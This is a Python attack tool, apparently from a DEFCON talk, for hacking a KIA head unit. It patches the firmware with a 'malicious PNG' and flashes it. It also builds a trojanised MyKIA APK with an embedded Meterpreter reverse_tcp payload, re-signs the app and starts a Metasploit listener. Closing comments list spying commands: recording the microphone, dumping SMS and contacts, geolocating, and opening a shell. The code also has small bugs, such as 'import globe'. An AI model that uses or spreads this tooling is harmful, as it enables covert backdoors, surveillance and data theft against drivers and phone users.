import os
import subprocess
import shutil, tempfile, globe

def find_png_offset(png_path, binary_path):
    with open(png_path, 'rb') as f:
        png_data = f.read()
    with open(binary_path, 'rb') as f:
        binary_data = f.read()

    offset = binary_data.find(png_data)
    print(f"offset: {offset}")
    print(f"size target image: {len(png_data)}")
    if offset != -1:
        print(f'[+] PNG found at offset: {hex(offset)} ({offset} in decimal)')
        return offset, len(png_data)
    else:
        print('[-] PNG not found in binary.')
        return None, None

def print_md5sum(file_path, label):
    print(f"[🔍] MD5 of {label}:")
    subprocess.run(["md5sum", file_path], check=True)

def patch_firmare_malicious_png():
    firmware_path = "firmware128-original-forpatch.bin"
    while True:
        # Step 1: Get paths
        original_png = "PNG_images/" + input("--> Enter the name of the original PNG (extracted from firmware): ").strip()
        second_png = "PNG_images/" + input("--> Enter the name of the new PNG to insert: ").strip()
        feature = input("--> Enter in a word the feature of this new firmware: ").strip()

        # Step 2: Find offset and original size
        offset, orig_size = find_png_offset(original_png, firmware_path)
        if offset is None:
            continue

        # Step 3: Check size of second image
        new_size = os.path.getsize(second_png)
        print(f"[+] Size of new image: {new_size} bytes")
        if new_size > orig_size:
            print(f"[❌] Error: New image is larger than the original image ({new_size} > {orig_size}). Aborting.")
            continue

        if new_size < orig_size:
            # Step 4: Pad new image if necessary
            padded_image = second_png.replace(".png", "-padded.png")
            print(f"[+] Padding new image to {orig_size} bytes...")
            subprocess.run(["cp", second_png, padded_image], check=True)
            subprocess.run(["truncate", "-s", str(orig_size), padded_image], check=True)
            # Verify padding was successful
            padded_size = os.path.getsize(padded_image)
            print(f"[🔍] Size of padded image: {padded_size} bytes")
            if padded_size != orig_size:
                print(f"[❌] Error: Padded image size ({padded_size}) does not match original image size ({orig_size}). Aborting.")
                continue
        
        if new_size == orig_size:
            padded_image = second_png

        # Step 5: Show MD5 of original firmware
        print_md5sum(firmware_path, "original firmware")

        # Step 6: Create patched firmware copy
        firmware_path_2 = f"firmware_patches_success/firmware-patched-{feature}.bin"
        subprocess.run(["cp", firmware_path, firmware_path_2], check=True)

        # Step 7: Replace image in firmware using dd
        print(f"[+] Replacing original image at offset {hex(offset)} with padded image...")
        subprocess.run([
            "dd",
            f"if={padded_image}",
            f"of={firmware_path_2}",
            "bs=1",
            f"seek={str(offset)}",
            "conv=notrunc"
        ], check=True)

        # Step 8: Show MD5 of patched firmware
        print_md5sum(firmware_path_2, "patched firmware")

        # Step 9: Verify - extract image from patched firmware
        print("[🧪] Extracting image from patched firmware for verification...")
        subprocess.run([
            "dd",
            f"if={firmware_path_2}",
            "of=image_extracted_patched_firmware.png",
            "bs=1",
            f"skip={str(offset)}",
            f"count={str(orig_size)}",
            "status=none"
        ], check=True)
        print("[✅] Verification image saved as: image_extracted_patched_firmware.png")

        # Step 10: Open the extracted image
        print(f"[🖼️] Opening extracted image for manual verification...")
        subprocess.run(["xdg-open", "image_extracted_patched_firmware.png"])

        print("[✅] Done.")

        # Ask user if they want to run again
        again = input("\n[?] Do you want to patch another image? (y/n): ").strip().lower()
        if again != 'y':
            print("[-] Exiting.")
            break

        firmware_path = firmware_path_2

def run_command(cmd, shell=True):
    print(f"\n[+] Running: {cmd}")
    try:
        result = subprocess.run(cmd, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print(result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e.stderr}")
        return False

def clean_generated_files():
    print("[*] Cleaning APK files and temporary folders...")

    # Delete all .apk files in current directory
    apk_files = glob.glob("*.apk")
    for apk in apk_files:
        try:
            os.remove(apk)
            print(f"[+] Deleted APK file: {apk}")
        except Exception as e:
            print(f"[-] Failed to delete {apk}: {e}")

    # Delete folders if they exist
    folders_to_delete = ["original_app", "payload_app"]
    for folder in folders_to_delete:
        if os.path.isdir(folder):
            try:
                shutil.rmtree(folder)
                print(f"[+] Deleted folder: {folder}")
            except Exception as e:
                print(f"[-] Failed to delete {folder}: {e}")

    print("[*] Cleanup complete.")

def create_malicious_apk():
    #Delete generateds files
    clean_generated_files()

    # Step 1: Get LHOST and LPORT
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT (your port): ").strip()

    # Step 2: Generate backdoor APK with msfvenom
    msfvenom_cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o backdoor.apk"
    if not run_command(msfvenom_cmd):
        return

    # Step 3: Decompile both APKs
    if not run_command("apktool d mykia.apk -o original_app"):
        return
    if not run_command("apktool d backdoor.apk -o payload_app"):
        return

    # Step 4: Replace MainActivity.smali
    main_activity_path = "original_app/smali/com/kia/eu/mykia/."
    os.makedirs(main_activity_path, exist_ok=True)
    if not run_command(f"cp MainActivity.smali {main_activity_path}"):
        return

    # Step 5: Ask permission handling
    print("\nPermission Options:")
    print("1. Maintain the original app's permissions")
    print("2. Allow all permissions (use payload's AndroidManifest.xml)")
    perm_choice = input("Choose an option (1/2): ").strip()

    if perm_choice == "2":
        if not run_command("cp AndroidManifest.xml original_app/AndroidManifest.xml"):
            return

    # Step 6: Copy payload smali to original app
    if not run_command("cp -r payload_app/smali/com/metasploit original_app/smali/com/"):
        return

    # Step 7: Rebuild APK
    if not run_command("apktool b original_app -o evil_app.apk"):
        return

    # Step 8: Signing
    print("\nSigning Options:")
    print("1. Create new keys and sign APK")
    print("2. Use existing keys to sign APK")
    sign_choice = input("Choose an option (1/2): ").strip()

    if sign_choice == "1":
        print("[*] You will now be prompted to generate a key...")
        if not run_command("keytool -genkey -v -keystore my-release-key.keystore "
                           "-alias myalias -keyalg RSA -keysize 2048 -validity 10000"):
            return
        print("[+] Key generated successfully.")

    if sign_choice in ["1", "2"]:
        ks_pass = input("Enter keystore password: ").strip()
        key_pass = input("Enter key password: ").strip()
        sign_cmd = f"""apksigner sign --ks my-release-key.keystore --ks-key-alias myalias \
--ks-pass pass:{ks_pass} --key-pass pass:{key_pass} \
--out kia.apk evil_app.apk"""
        if not run_command(sign_cmd):
            return

    if os.path.exists("evil_app_signed.apk"):
        print("\n✅ APK injection and signing successful! File created: evil_app_signed.apk")
    else:
        print("❌ Something went wrong. APK not created.")

def flash_firmware():
    firmware_path = input("Enter the full path to the firmware file to flash: ").strip()

    # Validate if the file exists
    if not os.path.isfile(firmware_path):
        print(f"[-] Error: File not found at path '{firmware_path}'")
        return

    # Build and execute the flashrom command
    cmd = f"flashrom -p ch341a_spi -c W25Q128.V -w '{firmware_path}'"
    success = run_command(cmd)

    if success:
        print("\n✅ Firmware successfully written to the chip.")
    else:
        print("\n❌ Firmware flashing failed.")

def start_meterpreter_listener():
    lhost = input("Enter your LHOST (IP to listen on): ").strip()
    lport = input("Enter your LPORT (port to listen on): ").strip()

    # Create a temporary resource file for msfconsole
    with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".rc") as rc_file:
        rc_file.write(f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""")
        rc_filename = rc_file.name

    print(f"\n[+] Launching Metasploit listener with LHOST={lhost} and LPORT={lport}...")

    try:
        subprocess.run(["msfconsole", "-r", rc_filename])
    except FileNotFoundError:
        print("[-] Error: msfconsole not found. Make sure Metasploit is installed and in your PATH.")
    finally:
        # Optionally delete the temporary file
        os.remove(rc_filename)



def main():
    banner = """

██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗██╗   ██╗██╗    ██╗  ██╗██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║██║   ██║██║    ██║ ██╔╝██║██╔══██╗
███████║███████║██║     █████╔╝     ██║██║   ██║██║    █████╔╝ ██║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██║╚██╗ ██╔╝██║    ██╔═██╗ ██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██║ ╚████╔╝ ██║    ██║  ██╗██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                         ______
                        /|_||_\\`.__
                        (   _    _ _\\
                        =`-(_)--(_)-'                                                                                             
                by @revers3vrything - Danilo Erazo
                    v2 August 2025 DEFCON33
            Tool to hack a KIA Head Unit with iRTOS                                                                                            
"""
    while True:
        print(banner)
        print("Select an option:")
        print("1. Patch firmware with malicious PNG")
        print("2. Create malicious APK")
        print("3. Flash firmware")
        print("4. Start Meterpreter listener")
        print("5. Exit")

        choice = input("Enter your choice (1-5): ").strip()

        if choice == "1":
            patch_firmare_malicious_png()
        elif choice == "2":
            create_malicious_apk()
        elif choice == "3":
            flash_firmware()
        elif choice == "4":
            start_meterpreter_listener()
        elif choice == "5":
            print("Exiting program. Goodbye.")
            break
        else:
            print("Invalid choice. Please enter a number between 1 and 5.")

        input("\nPress Enter to continue...")
    

        

if __name__ == "__main__":
    main()

#sysinfo
#getuid
#record_mic -d 20 -f /recorded.wav
#dump_sms -o /sms.txt
#dump_contacts -o /contacts.txt
#geolocate
#shell
